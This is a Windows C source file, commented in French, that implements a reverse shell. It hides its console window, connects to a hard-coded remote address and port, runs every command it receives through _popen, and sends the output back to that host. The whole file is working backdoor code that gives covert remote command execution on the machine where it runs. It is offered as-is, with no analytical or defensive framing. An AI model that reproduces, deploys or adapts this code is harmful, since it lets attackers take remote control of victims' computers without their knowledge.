
#pragma comment(lib, "ws2_32.lib") // Lier automatiquement la bibliothèque ws2_32.lib pour les fonctionnalités de socket sous Windows

#define _WINSOCK_DEPRECATED_NO_WARNINGS // Désactiver les avertissements liés à inet_addr()

#define _CRT_SECURE_NO_WARNINGS // Désactiver les avertissements liés à strcat()

#include <stdio.h> // Inclusion de la bibliothèque standard d'entrée/sortie

#include <stdlib.h> // Inclusion de la bibliothèque standard pour la gestion de la mémoire dynamique

#include <winsock2.h> // Inclusion de la bibliothèque pour la gestion des sockets Windows

#ifdef _WIN32_WINNT
#undef _WIN32_WINNT
#endif

#define _WIN32_WINNT 0x0500 // Définir la version minimale de Windows prise en charge

#include <windows.h> // Inclusion de la bibliothèque spécifique à Windows pour l'API Windows

#define PORT 50000 // Définir le port du module client

#define CLIENT "10.0.0.254" // Définir l'adresse IP du module client

int main(void){

    HWND fenetre = GetConsoleWindow(); // Obtenir la fenêtre de la console
    ShowWindow(fenetre, SW_MINIMIZE); // Minimiser la fenêtre de la console
    ShowWindow(fenetre, SW_HIDE); // Cacher la fenêtre de la console
    WSADATA WSAData; // Déclaration de la structure pour les informations sur l'implémentation des sockets Windows
    int erreur = WSAStartup(MAKEWORD(2, 2), &WSAData); // Initialiser la bibliothèque winsock2 avec la version 2.2

    SOCKET sock; // Déclaration de l'objet socket
    SOCKADDR_IN sin; // Déclaration de la structure pour configurer la connexion
    char buffer[999]=""; // Tableau de caractères pour stocker les commandes à envoyer et recevoir

    if (!erreur){
        sock = socket(AF_INET, SOCK_STREAM, 0); // Créer un socket
        sin.sin_addr.s_addr = inet_addr(CLIENT); // Définir l'adresse IP du client
        sin.sin_family = AF_INET; // Définir la famille d'adresses
        sin.sin_port = htons(PORT); // Définir le port

        if(connect(sock, (SOCKADDR*)& sin, sizeof(sin)) != SOCKET_ERROR){ // Connecter le socket au client
            while(recv(sock, buffer, 999, 0) != SOCKET_ERROR){ // Recevoir des commandes du client
                FILE* fp; // Déclaration du pointeur de fichier
                char path[999]; // Déclaration du tableau pour stocker le chemin
                fp = _popen(buffer, "r"); // Exécuter la commande reçue
                char buffer[9999]=""; // Déclaration du tableau pour stocker la sortie de la commande
                while (fgets(path, sizeof(path) -1, fp) != NULL){ // Lire la sortie de la commande
                    strcat(buffer, path); // Concaténer la sortie dans le buffer
                }
                send(sock, buffer, strlen(buffer)+1, 0); // Envoyer la sortie au client
                _pclose(fp); // Fermer le pointeur de fichier
            }
            closesocket(sock); // Fermer le socket
            WSACleanup(); // Nettoyer l'implémentation des sockets Windows
        }
    }
    return 0; // Retourner 0 pour indiquer la fin du programme
}
